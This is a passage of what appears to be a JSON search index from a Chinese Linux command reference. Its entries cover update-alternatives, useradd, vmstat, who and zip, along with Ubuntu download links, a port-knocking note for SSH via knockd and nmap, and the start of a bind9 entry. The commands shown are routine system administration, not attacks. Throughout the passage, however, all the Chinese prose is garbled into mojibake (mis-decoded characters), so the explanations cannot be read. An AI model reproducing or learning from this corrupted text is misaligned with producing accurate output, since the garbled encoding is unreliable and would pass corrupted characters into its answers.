ä¸€èˆ¬æ˜¯ç³»ç»Ÿçš„é»˜è®¤PATHä¸‹, ä¸»è¦æ˜¯: /usr/bin ä¸‹é¢æˆ–è€… /usr/local/bin ä¸‹. é“¾æ¥çš„ç›®æ ‡ä¸ºç¬¬äºŒå±‚è·¯å¾„. ç¬¬äºŒå±‚è·¯å¾„, è½¯é“¾æ¥, ä¸ºalternativesçš„ç®¡ç†ç›®å½• /etc/alternatives é“¾æ¥ç›®æ ‡ä¸ºç¬¬ä¸‰å±‚. ç¬¬ä¸‰å±‚è·¯å¾„, æ‰§è¡Œæ–‡ä»¶çš„çœŸå®è·¯å¾„, å¯ä»¥ä¸ºä»»æ„è·¯å¾„, æ¯”å¦‚è‡ªå·±å®‰è£…çš„Python /usr/local/mypython/bin/python ç”¨æ³• ç”¨æ³•: update-alternatives [<é€‰é¡¹> ...] <å‘½ä»¤> å‘½ä»¤: --install <é“¾æ¥> <åç§°> <è·¯å¾„> <ä¼˜å…ˆçº§> [--slave <é“¾æ¥> <åç§°> <è·¯å¾„>] ... åœ¨ç³»ç»Ÿä¸­åŠ å…¥ä¸€ç»„å€™é€‰é¡¹ã€‚ --remove <åç§°> <è·¯å¾„> ä» <åç§°> æ›¿æ¢ç»„ä¸­å»é™¤ <è·¯å¾„> é¡¹ã€‚ --remove-all <åç§°> ä»æ›¿æ¢ç³»ç»Ÿä¸­åˆ é™¤ <åç§°> æ›¿æ¢ç»„ã€‚ --auto <åç§°> å°† <åç§°> çš„ä¸»é“¾æ¥åˆ‡æ¢åˆ°è‡ªåŠ¨æ¨¡å¼ã€‚ --display <åç§°> æ˜¾ç¤ºå…³äº <åç§°> æ›¿æ¢ç»„çš„ä¿¡æ¯ã€‚ --query <åç§°> æœºå™¨å¯è¯»ç‰ˆçš„ --display <åç§°>. --list <åç§°> åˆ—å‡º <åç§°> æ›¿æ¢ç»„ä¸­æ‰€æœ‰çš„å¯ç”¨å€™é€‰é¡¹ã€‚ --get-selections åˆ—å‡ºä¸»è¦å€™é€‰é¡¹åç§°ä»¥åŠå®ƒä»¬çš„çŠ¶æ€ã€‚ --set-selections ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥å€™é€‰é¡¹çš„çŠ¶æ€ã€‚ --config <åç§°> åˆ—å‡º <åç§°> æ›¿æ¢ç»„ä¸­çš„å¯é€‰é¡¹ï¼Œå¹¶å°±ä½¿ç”¨å…¶ä¸­å“ªä¸€ä¸ªï¼Œå¾è¯¢ç”¨æˆ·çš„æ„è§ã€‚ --set <åç§°> <è·¯å¾„> å°† <è·¯å¾„> è®¾ç½®ä¸º <åç§°> çš„å€™é€‰é¡¹ã€‚ --all å¯¹æ‰€æœ‰å¯é€‰é¡¹ä¸€ä¸€è°ƒç”¨ --config å‘½ä»¤ã€‚ <é“¾æ¥> æ˜¯æŒ‡å‘ /etc/alternatives/<åç§°> çš„ç¬¦å·é“¾æ¥ã€‚(å¦‚ /usr/bin/pager) <åç§°> æ˜¯è¯¥é“¾æ¥æ›¿æ¢ç»„çš„ä¸»æ§åã€‚(å°±æ˜¯/etc/alternatives/<åç§°>çš„<åç§°>, å¦‚ pager) <è·¯å¾„> æ˜¯å€™é€‰é¡¹ç›®æ ‡æ–‡ä»¶çš„ä½ç½®ã€‚(çœŸå®è·¯å¾„, å¦‚ /usr/bin/less) <ä¼˜å…ˆçº§> æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œåœ¨è‡ªåŠ¨æ¨¡å¼ä¸‹ï¼Œè¿™ä¸ªæ•°å­—è¶Šé«˜çš„é€‰é¡¹ï¼Œå…¶ä¼˜å…ˆçº§ä¹Ÿå°±è¶Šé«˜ã€‚ .......... installçš„è¯´æ˜, ä¸¾ä¾‹, å°† /path/to/javac è®¾ç½®ä¸ºä¼˜å…ˆçº§ä¸º 100 çš„ javac å¯æ›¿ä»£é¡¹ï¼Œ å¹¶å°† /usr/bin/java å…³è”åˆ°ä¸»é¡¹ /path/to/java sudo update-alternatives --install /usr/bin/javac javac /path/to/javac 100 --slave /usr/bin/java java /path/to/java ä»¥ä¾¿äºå°†ä»å±é¡¹ä¸ä¸»é¡¹å…³è”èµ·æ¥ï¼Œå¹¶åœ¨åˆ‡æ¢ä¸»é¡¹æ—¶è‡ªåŠ¨æ›´æ–°ä»å±é¡¹çš„é“¾æ¥ å®é™…åº”ç”¨ å½“å®‰è£…äº†å¤šä¸ªç¼–è¾‘å™¨æˆ–è€…å¤šä¸ªä¸åŒç‰ˆæœ¬çš„è½¯ä»¶å¦‚JAVAæ—¶, å¯ä»¥ç”¨æ¥å¤„ç†æ‰§è¡Œæ—¶ä½¿ç”¨å“ªä¸ªJAVA. å®‰è£…æ—¶å€™, æ·»åŠ åˆ°ç®¡ç†: update-alternatives --install /usr/local/bin/java java /usr/local/myjava/bin/java 10 è¿™ä¸ªæ—¶å€™ä½¿ç”¨ä¼šè‡ªåŠ¨æŒ‰ç…§ä¼˜å…ˆçº§çš„é¡ºåºæ¥é€‰æ‹©, å¯ä»¥çœ‹çœ‹javaå·²ç»æ³¨å†Œäº†å“ªäº›: update-alternatives --display java å¦‚æœéœ€è¦æ‰‹åŠ¨é€‰æ‹©, å¯ä½¿ç”¨configæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ç•Œé¢è®©ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©: update-alternatives --config java é‡æ–°ä¿®æ”¹ä¸ºè‡ªåŠ¨: update-alternatives --auto java å¦‚æœéœ€è¦ç›´æ¥è®¾ç½®: update-alternatives --set java /usr/local/myjava/bin/java","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-alternatives.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-alternatives.html"},{"title":"update-desktop-database","text":"ä»¥GNOMEæ¡Œé¢ç¯å¢ƒä¸ºä¾‹, æ¡Œé¢ç¯å¢ƒçš„åº”ç”¨èœå•å¹¶ä¸æ˜¯å®æ—¶æ‰«ææ‰€æœ‰çš„ .desktop æ–‡ä»¶,è€Œæ˜¯ç»´æŠ¤ä¸€ä¸ªæ¡Œé¢æ–‡ä»¶çš„æ•°æ®åº“ã€‚ å½“ .desktop æ–‡ä»¶å‘ç”Ÿå˜åŒ–æ—¶,éœ€è¦è¿è¡Œ update-desktop-database æ¥åˆ·æ–°è¿™ä¸ªæ•°æ®åº“ å¦‚æ‰«æ /usr/share/applications ç›®å½•ä¸‹çš„ .desktop æ–‡ä»¶,å¹¶æ›´æ–°æ¡Œé¢ç¯å¢ƒçš„åº”ç”¨èœå•æ•°æ®åº“: update-desktop-database /usr/share/applications","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-desktop-database.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-update-desktop-database.html"},{"title":"useradd","text":"åŠŸèƒ½ linuxå¢åŠ ç”¨æˆ· é€‰é¡¹ useraddé€‰é¡¹ é€‰é¡¹ -m è‡ªåŠ¨å»ºç«‹ç”¨æˆ·ç›®å½• -c<å¤‡æ³¨> åŠ ä¸Šå¤‡æ³¨æ–‡å­—ã€‚å¤‡æ³¨æ–‡å­—ä¼šä¿å­˜åœ¨passwdçš„å¤‡æ³¨æ ä½ä¸­ï¼› -d<ç™»å…¥ç›®å½•> æŒ‡å®šç”¨æˆ·ç™»å…¥æ—¶çš„å¯å§‹ç›®å½•ï¼› -D å˜æ›´é¢„è®¾å€¼ï¼› -e<æœ‰æ•ˆæœŸé™> æŒ‡å®šå¸å·çš„æœ‰æ•ˆæœŸé™ï¼› -f<ç¼“å†²å¤©æ•°> æŒ‡å®šåœ¨å¯†ç è¿‡æœŸåå¤šå°‘å¤©å³å…³é—­è¯¥å¸å·ï¼› -g<ç¾¤ç»„> æŒ‡å®šç”¨æˆ·æ‰€å±çš„ç¾¤ç»„ï¼› -G<ç¾¤ç»„> æŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç¾¤ç»„ï¼› -m è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ï¼› -M ä¸è¦è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ï¼› -n å–æ¶ˆå»ºç«‹ä»¥ç”¨æˆ·åç§°ä¸ºåçš„ç¾¤ç»„ï¼› -r å»ºç«‹ç³»ç»Ÿå¸å·ï¼› -s<shell> æŒ‡å®šç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shellï¼› -u<uid> æŒ‡å®šç”¨æˆ·idã€‚ ä½¿ç”¨ é€šç”¨, å»ºç«‹ç”¨æˆ· yanque , è‡ªåŠ¨å»ºç«‹ç”¨æˆ·ç›®å½•, ç™»å½•shell /bin/bash , æŒ‡å®šç”¨æˆ·ç™»å…¥ç›®å½•ä¸º /home/yanque , ä¸æŒ‡å®šç”¨æˆ·ç»„, ä¼šè‡ªåŠ¨å»ºç«‹ç”¨æˆ·ç¾¤ç»„ yanque useradd yanque -m -s /bin/bash -d /home/yanque","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-useradd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-useradd.html"},{"title":"vmstat","text":"vmstatæ˜¯Virtual Meomory Statisticsï¼ˆè™šæ‹Ÿå†…å­˜ç»Ÿè®¡ï¼‰çš„ç¼©å†™ï¼Œ å¯å¯¹æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜ã€è¿›ç¨‹ã€CPUæ´»åŠ¨è¿›è¡Œç›‘æ§ã€‚ å®ƒæ˜¯å¯¹ç³»ç»Ÿçš„æ•´ä½“æƒ…å†µè¿›è¡Œç»Ÿè®¡ï¼Œ ä¸è¶³ä¹‹å¤„æ˜¯æ— æ³•å¯¹æŸä¸ªè¿›ç¨‹è¿›è¡Œæ·±å…¥åˆ†æã€‚ vmstatå·¥å…·æä¾›äº†ä¸€ç§ä½å¼€é”€çš„ç³»ç»Ÿæ€§èƒ½è§‚å¯Ÿæ–¹å¼ã€‚ å› ä¸ºvmstatæœ¬èº«å°±æ˜¯ä½å¼€é”€å·¥å…·ï¼Œ åœ¨éå¸¸é«˜è´Ÿè·çš„æœåŠ¡å™¨ä¸Šï¼Œ ä½ éœ€è¦æŸ¥çœ‹å¹¶ç›‘æ§ç³»ç»Ÿçš„å¥åº·æƒ…å†µï¼Œåœ¨æ§åˆ¶çª—å£è¿˜æ˜¯èƒ½å¤Ÿä½¿ç”¨vmstatè¾“å‡ºç»“æœã€‚ è¯­æ³•: vmstat [-a] [-n] [-S unit] [delay [ count]] vmstat [-s] [-n] [-S unit] vmstat [-m] [-n] [delay [ count]] vmstat [-d] [-n] [delay [ count]] vmstat [-p disk partition] [-n] [delay [ count]] vmstat [-f] vmstat [-V] é€‰é¡¹ -a æ˜¾ç¤ºæ´»è·ƒå’Œéæ´»è·ƒå†…å­˜ -f æ˜¾ç¤ºä»ç³»ç»Ÿå¯åŠ¨è‡³ä»Šçš„forkæ•°é‡ ã€‚ -m æ˜¾ç¤ºslabinfo -n åªåœ¨å¼€å§‹æ—¶æ˜¾ç¤ºä¸€æ¬¡å„å­—æ®µåç§°ã€‚ -s æ˜¾ç¤ºå†…å­˜ç›¸å…³ç»Ÿè®¡ä¿¡æ¯åŠå¤šç§ç³»ç»Ÿæ´»åŠ¨æ•°é‡ã€‚ -d æ˜¾ç¤ºç£ç›˜ç›¸å…³ç»Ÿè®¡ä¿¡æ¯ -p æ˜¾ç¤ºæŒ‡å®šç£ç›˜åˆ†åŒºç»Ÿè®¡ä¿¡æ¯ -S ä½¿ç”¨æŒ‡å®šå•ä½æ˜¾ç¤ºã€‚å‚æ•°æœ‰ k ã€K ã€m ã€Mï¼Œ åˆ†åˆ«ä»£è¡¨1000ã€1024ã€1000000ã€1048576å­—èŠ‚ï¼ˆbyteï¼‰ã€‚é»˜è®¤å•ä½ä¸ºKï¼ˆ1024 bytesï¼‰ -V æ˜¾ç¤ºvmstatç‰ˆæœ¬ä¿¡æ¯ã€‚ delay åˆ·æ–°æ—¶é—´é—´éš”ã€‚å¦‚æœä¸æŒ‡å®šï¼Œåªæ˜¾ç¤ºä¸€æ¡ç»“æœã€‚ count åˆ·æ–°æ¬¡æ•°ã€‚å¦‚æœä¸æŒ‡å®šåˆ·æ–°æ¬¡æ•°ï¼Œä½†æŒ‡å®šäº†åˆ·æ–°æ—¶é—´é—´éš”ï¼Œè¿™æ—¶åˆ·æ–°æ¬¡æ•°ä¸ºæ— ç©·ã€‚ è¾“å‡ºå«ä¹‰ å¦‚ç›´æ¥æ‰§è¡Œ: # vmstat procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 2 0 0 6300920 268396 937448 0 0 1944 289 532 779 1 2 97 1 0 procs r åˆ—è¡¨ç¤ºè¿è¡Œå’Œç­‰å¾…cpuæ—¶é—´ç‰‡çš„è¿›ç¨‹æ•°ï¼Œå¦‚æœé•¿æœŸå¤§äº1ï¼Œè¯´æ˜cpuä¸è¶³ï¼Œéœ€è¦å¢åŠ cpu; b åˆ—è¡¨ç¤ºåœ¨ç­‰å¾…èµ„æºçš„è¿›ç¨‹æ•°ï¼Œæ¯”å¦‚æ­£åœ¨ç­‰å¾…I/Oã€æˆ–è€…å†…å­˜äº¤æ¢ç­‰ memory swpd åˆ‡æ¢åˆ°å†…å­˜äº¤æ¢åŒºçš„å†…å­˜æ•°é‡(kè¡¨ç¤º), å¦‚æœswpdçš„å€¼ä¸ä¸º0ï¼Œæˆ–è€…æ¯”è¾ƒå¤§ï¼Œæ¯”å¦‚è¶…è¿‡äº†100mï¼Œåªè¦siã€soçš„å€¼é•¿æœŸä¸º0ï¼Œç³»ç»Ÿæ€§èƒ½è¿˜æ˜¯æ­£å¸¸ free å½“å‰çš„ç©ºé—²é¡µé¢åˆ—è¡¨ä¸­å†…å­˜æ•°é‡(kè¡¨ç¤º) buff ä½œä¸ºbuffer cacheçš„å†…å­˜æ•°é‡ï¼Œä¸€èˆ¬å¯¹å—è®¾å¤‡çš„è¯»å†™æ‰éœ€è¦ç¼“å†²ã€‚ cache: ä½œä¸ºpage cacheçš„å†…å­˜æ•°é‡ï¼Œä¸€èˆ¬ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿçš„cacheï¼Œ å¦‚æœcacheè¾ƒå¤§ï¼Œè¯´æ˜ç”¨åˆ°cacheçš„æ–‡ä»¶è¾ƒå¤šï¼Œå¦‚æœæ­¤æ—¶IOä¸­biæ¯”è¾ƒå°ï¼Œè¯´æ˜æ–‡ä»¶ç³»ç»Ÿæ•ˆç‡æ¯”è¾ƒå¥½ã€‚ swap si ç”±ç£ç›˜è¿›å…¥å†…å­˜äº¤æ¢åŒºæ•°é‡ so ç”±å†…å­˜äº¤æ¢åŒºè¿›å…¥ç£ç›˜æ•°é‡ IO bi ä»å—è®¾å¤‡è¯»å…¥æ•°æ®çš„æ€»é‡ï¼ˆè¯»ç£ç›˜ï¼‰ï¼ˆæ¯ç§’kbï¼‰ bo å—è®¾å¤‡å†™å…¥æ•°æ®çš„æ€»é‡ï¼ˆå†™ç£ç›˜ï¼‰ï¼ˆæ¯ç§’kbï¼‰ è¿™é‡Œæˆ‘ä»¬è®¾ç½®çš„bi+boå‚è€ƒå€¼ä¸º1000ï¼Œå¦‚æœè¶…è¿‡1000ï¼Œ è€Œä¸”waå€¼è¾ƒå¤§åº”è¯¥è€ƒè™‘å‡è¡¡ç£ç›˜è´Ÿè½½ï¼Œå¯ä»¥ç»“åˆiostatè¾“å‡ºæ¥åˆ†æã€‚ system æ˜¾ç¤ºé‡‡é›†é—´éš”å†…å‘ç”Ÿçš„ä¸­æ–­æ•° in åˆ—è¡¨ç¤ºåœ¨æŸä¸€æ—¶é—´é—´éš”ä¸­è§‚æµ‹åˆ°çš„æ¯ç§’è®¾å¤‡ä¸­æ–­æ•° csåˆ—è¡¨ç¤ºæ¯ç§’äº§ç”Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼Œå¦‚å½“ cs æ¯”ç£ç›˜ I/O å’Œç½‘ç»œä¿¡æ¯åŒ…é€Ÿç‡é«˜å¾—å¤šï¼Œéƒ½åº”è¿›è¡Œè¿›ä¸€æ­¥è°ƒæŸ¥ã€‚ cpu è¡¨ç¤ºcpuçš„ä½¿ç”¨çŠ¶æ€ us åˆ—æ˜¾ç¤ºäº†ç”¨æˆ·æ–¹å¼ä¸‹æ‰€èŠ±è´¹ CPU æ—¶é—´çš„ç™¾åˆ†æ¯”ã€‚ usçš„å€¼æ¯”è¾ƒé«˜æ—¶ï¼Œè¯´æ˜ç”¨æˆ·è¿›ç¨‹æ¶ˆè€—çš„cpuæ—¶é—´å¤šï¼Œä½†æ˜¯å¦‚æœé•¿æœŸå¤§äº50%ï¼Œéœ€è¦è€ƒè™‘ä¼˜åŒ–ç”¨æˆ·çš„ç¨‹åºã€‚ sy åˆ—æ˜¾ç¤ºäº†å†…æ ¸è¿›ç¨‹æ‰€èŠ±è´¹çš„cpuæ—¶é—´çš„ç™¾åˆ†æ¯”ã€‚è¿™é‡Œus + syçš„å‚è€ƒå€¼ä¸º80%ï¼Œå¦‚æœus+sy å¤§äº 80%è¯´æ˜å¯èƒ½å­˜åœ¨CPUä¸è¶³ã€‚ id åˆ—æ˜¾ç¤ºäº†cpuå¤„åœ¨ç©ºé—²çŠ¶æ€çš„æ—¶é—´ç™¾åˆ†æ¯” wa åˆ—æ˜¾ç¤ºäº†IOç­‰å¾…æ‰€å ç”¨çš„CPUæ—¶é—´çš„ç™¾åˆ†æ¯”ã€‚ å¦‚æœwaè¶…è¿‡30%ï¼Œè¯´æ˜IOç­‰å¾…ä¸¥é‡ï¼Œ è¿™å¯èƒ½æ˜¯ç£ç›˜å¤§é‡éšæœºè®¿é—®é€ æˆçš„ï¼Œä¹Ÿå¯èƒ½ç£ç›˜æˆ–è€…ç£ç›˜è®¿é—®æ§åˆ¶å™¨çš„å¸¦å®½ç“¶é¢ˆé€ æˆçš„(ä¸»è¦æ˜¯å—æ“ä½œ)ã€‚ å‚è€ƒ: https://zhuanlan.zhihu.com/p/162711990","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-vmstat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-vmstat.html"},{"title":"who","text":"æŸ¥çœ‹å½“å‰æ‰€æœ‰ç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ æ”¯æŒçš„é€‰é¡¹/å‚æ•°: -m, am i åªæ˜¾ç¤ºæ‰§è¡Œwhoå‘½ä»¤çš„ç”¨æˆ·å, ç™»é™†ç»ˆç«¯å’Œç™»å½•æ—¶é—´ -q, --count åªæ˜¾ç¤ºç”¨æˆ·çš„ç™»å½•è´¦å·å’Œç™»å½•ç”¨æˆ·æ•°é‡ -u åœ¨ç™»å½•æ—¶é—´åæ˜¾ç¤ºç”¨æˆ·æœ€åä¸€æ¬¡æ“ä½œæ—¶é—´åˆ°å½“å‰æ—¶é—´çš„é—´éš” --heading æ˜¾ç¤ºåˆ—æ ‡é¢˜","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-who.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-who.html"},{"title":"zip","text":"å‹ç¼©æ–‡ä»¶, zip æ˜¯ä¸ªä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œå‹ç¼©åçš„æ–‡ä»¶åç¼€åä¸º .zipã€‚ è¯­æ³•: zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b <å·¥ä½œç›®å½•>][-ll][-n <å­—å°¾å­—ç¬¦ä¸²>][-t <æ—¥æœŸæ—¶é—´>][-<å‹ç¼©æ•ˆç‡>][å‹ç¼©æ–‡ä»¶][æ–‡ä»¶...][-i <èŒƒæœ¬æ ·å¼>][-x <èŒƒæœ¬æ ·å¼>] å‚æ•°: -A è°ƒæ•´å¯æ‰§è¡Œçš„è‡ªåŠ¨è§£å‹ç¼©æ–‡ä»¶ã€‚ -b<å·¥ä½œç›®å½•> æŒ‡å®šæš‚æ—¶å­˜æ”¾æ–‡ä»¶çš„ç›®å½•ã€‚ -c æ›¿æ¯ä¸ªè¢«å‹ç¼©çš„æ–‡ä»¶åŠ ä¸Šæ³¨é‡Šã€‚ -d ä»å‹ç¼©æ–‡ä»¶å†…åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶ã€‚ -D å‹ç¼©æ–‡ä»¶å†…ä¸å»ºç«‹ç›®å½•åç§°ã€‚ -f æ›´æ–°ç°æœ‰çš„æ–‡ä»¶ã€‚ -F å°è¯•ä¿®å¤å·²æŸåçš„å‹ç¼©æ–‡ä»¶ã€‚ -g å°†æ–‡ä»¶å‹ç¼©åé™„åŠ åœ¨æ—¢æœ‰çš„å‹ç¼©æ–‡ä»¶ä¹‹åï¼Œè€Œéå¦è¡Œå»ºç«‹æ–°çš„å‹ç¼©æ–‡ä»¶ã€‚ -h åœ¨çº¿å¸®åŠ©ã€‚ -i<èŒƒæœ¬æ ·å¼> åªå‹ç¼©ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ã€‚ -j åªä¿å­˜æ–‡ä»¶åç§°åŠå…¶å†…å®¹ï¼Œè€Œä¸å­˜æ”¾ä»»ä½•ç›®å½•åç§°ã€‚ -J åˆ é™¤å‹ç¼©æ–‡ä»¶å‰é¢ä¸å¿…è¦çš„æ•°æ®ã€‚ -k ä½¿ç”¨MS-DOSå…¼å®¹æ ¼å¼çš„æ–‡ä»¶åç§°ã€‚ -l å‹ç¼©æ–‡ä»¶æ—¶ï¼ŒæŠŠLFå­—ç¬¦ç½®æ¢æˆLF+CRå­—ç¬¦ã€‚ -ll å‹ç¼©æ–‡ä»¶æ—¶ï¼ŒæŠŠLF+CRå­—ç¬¦ç½®æ¢æˆLFå­—ç¬¦ã€‚ -L æ˜¾ç¤ºç‰ˆæƒä¿¡æ¯ã€‚ -m å°†æ–‡ä»¶å‹ç¼©å¹¶åŠ å…¥å‹ç¼©æ–‡ä»¶åï¼Œåˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œå³æŠŠæ–‡ä»¶ç§»åˆ°å‹ç¼©æ–‡ä»¶ä¸­ã€‚ -n<å­—å°¾å­—ç¬¦ä¸²> ä¸å‹ç¼©å…·æœ‰ç‰¹å®šå­—å°¾å­—ç¬¦ä¸²çš„æ–‡ä»¶ã€‚ -o ä»¥å‹ç¼©æ–‡ä»¶å†…æ‹¥æœ‰æœ€æ–°æ›´æ”¹æ—¶é—´çš„æ–‡ä»¶ä¸ºå‡†ï¼Œå°†å‹ç¼©æ–‡ä»¶çš„æ›´æ”¹æ—¶é—´è®¾æˆå’Œè¯¥æ–‡ä»¶ç›¸åŒã€‚ -q ä¸æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚ -r é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚ -S åŒ…å«ç³»ç»Ÿå’Œéšè—æ–‡ä»¶ã€‚ -t<æ—¥æœŸæ—¶é—´> æŠŠå‹ç¼©æ–‡ä»¶çš„æ—¥æœŸè®¾æˆæŒ‡å®šçš„æ—¥æœŸã€‚ -T æ£€æŸ¥å¤‡ä»½æ–‡ä»¶å†…çš„æ¯ä¸ªæ–‡ä»¶æ˜¯å¦æ­£ç¡®æ— è¯¯ã€‚ -u ä¸ -f å‚æ•°ç±»ä¼¼ï¼Œä½†æ˜¯é™¤äº†æ›´æ–°ç°æœ‰çš„æ–‡ä»¶å¤–ï¼Œä¹Ÿä¼šå°†å‹ç¼©æ–‡ä»¶ä¸­çš„å…¶ä»–æ–‡ä»¶è§£å‹ç¼©åˆ°ç›®å½•ä¸­ã€‚ -v æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹æˆ–æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -V ä¿å­˜VMSæ“ä½œç³»ç»Ÿçš„æ–‡ä»¶å±æ€§ã€‚ -w åœ¨æ–‡ä»¶åç§°é‡Œå‡å¦‚ç‰ˆæœ¬ç¼–å·ï¼Œæœ¬å‚æ•°ä»…åœ¨VMSæ“ä½œç³»ç»Ÿä¸‹æœ‰æ•ˆã€‚ -x<èŒƒæœ¬æ ·å¼> å‹ç¼©æ—¶æ’é™¤ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ã€‚ -X ä¸ä¿å­˜é¢å¤–çš„æ–‡ä»¶å±æ€§ã€‚ -y ç›´æ¥ä¿å­˜ç¬¦å·è¿æ¥ï¼Œè€Œéè¯¥è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ï¼Œæœ¬å‚æ•°ä»…åœ¨UNIXä¹‹ç±»çš„ç³»ç»Ÿä¸‹æœ‰æ•ˆã€‚ -z æ›¿å‹ç¼©æ–‡ä»¶åŠ ä¸Šæ³¨é‡Šã€‚ -$ ä¿å­˜ç¬¬ä¸€ä¸ªè¢«å‹ç¼©æ–‡ä»¶æ‰€åœ¨ç£ç›˜çš„å·å†Œåç§°ã€‚ -<å‹ç¼©æ•ˆç‡> å‹ç¼©æ•ˆç‡æ˜¯ä¸€ä¸ªä»‹äº1-9çš„æ•°å€¼ã€‚ å®ä¾‹ å°† /home/html/ è¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“åŒ…ä¸ºå½“å‰ç›®å½•ä¸‹çš„ html.zip: zip -q -r html.zip /home/html æ³¨, å¦‚æœåœ¨æˆ‘ä»¬åœ¨ /home/html ç›®å½•ä¸‹ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤: zip -q -r html.zip * æ¥å®ç°ä¸€æ ·æ•ˆæœ. ä»å‹ç¼©æ–‡ä»¶ cp.zip ä¸­åˆ é™¤æ–‡ä»¶ a.c: zip -dv cp.zip a.c","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-zip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-zip.html"},{"title":"ä¸€äº›å¸¸è§å‘è¡Œç‰ˆä¸‹è½½","text":"Ubuntu å®˜ç½‘: https://cn.ubuntu.com/download/desktop Ubuntu14: https://releases.ubuntu.com/trusty/ Ubuntu22: https://releases.ubuntu.com/22.04/ubuntu-22.04.3-desktop-amd64.iso æ³¨è§£ å‘è¡Œç‰ˆçš„ LTS è¡¨ç¤ºé•¿æœŸæ”¯æŒ(ä¸€èˆ¬éƒ½æ˜¯äº”å¹´å§)","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Some-common-release-versions-download.html","loc":"/yq-doc-source-docs-operating-system-linux-Some-common-release-versions-download.html"},{"title":"ä¸€äº›å®‰å…¨ç›¸å…³æ–‡ä»¶","text":"# todo: /etc/login.defs umask å‘½ä»¤, åˆ›å»ºæ–‡ä»¶æƒé™å‡å»umaskè®¾ç½®çš„å€¼ /etc/login.defs å®šä¹‰ä¸ /etc/passwd , /etc/shadow é…å¥—çš„ç”¨æˆ·é™åˆ¶è®¾ç½® /etc/knockd.conf sshç›¸å…³æ•²é—¨ ä½¿ç”¨ nmap -p ç«¯å£å· IPåœ°å€ æŒ‰ç…§æ–‡ä»¶æ‰€ç»™çš„ç«¯å£ä¾æ¬¡æ•²é—¨å¯ä»¥æ¢å¤è®¿é—®","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Some-security--related-documents.html","loc":"/yq-doc-source-docs-operating-system-linux-Some-security--related-documents.html"},{"title":"xclip","text":"linuxä¸‹å‰ªåˆ‡æ¿ä¸ç»ˆç«¯çš„äº¤äº’.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-package-XClip.html","loc":"/yq-doc-source-docs-operating-system-linux-package-XClip.html"},{"title":"bind9","text":"å‚è€ƒ:: ISC BIND9 - æœ€è¯¦ç»†ã€æœ€è®¤çœŸçš„ä»é›¶å¼€å§‹çš„ BIND 9 - DNSæœåŠ¡æ­å»ºåŠå…¶åŸç†è®²è§£ å‰ç½® DNS DNS ( Domain Name Service) : åŸŸåè§£ææœåŠ¡, å°†å­—ç¬¦ä¸²åŸŸåè§£æä¸ºæ•°å­—IP DNS ZONE DNSåŸŸï¼Œè¢«ç”¨æ¥åˆ’åˆ†DNSä¸»åŸŸã€‚ ä¼ ç»Ÿçš„DNSåŸŸç±»ä¼¼ä¸€ä¸ªæ ‘çŠ¶çš„ç»“æ„ï¼Œè¢«åˆ†æˆä¸åŒçš„åŒºåŸŸï¼Œè¿™äº›åŒºåŸŸå¯åŒºåˆ†ä¸€ä¸ªDNSæœåŠ¡å™¨ä¸­å‘½åç©ºé—´ä¸­ä¸åŒçš„åŒºåŸŸã€‚ DNSåŒºåŸŸæ˜¯æ„æˆDNSå‘½åç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œç”±ç‰¹å®šç»„ç»‡æˆ–ç®¡ç†å‘˜åŠ ä»¥ç®¡ç†ï¼Œå…¶å¯ä»¥å¯¹æƒå¨æ€§åŸŸåæœåŠ¡å™¨ç­‰DNSç»„ä»¶æ›´åŠ 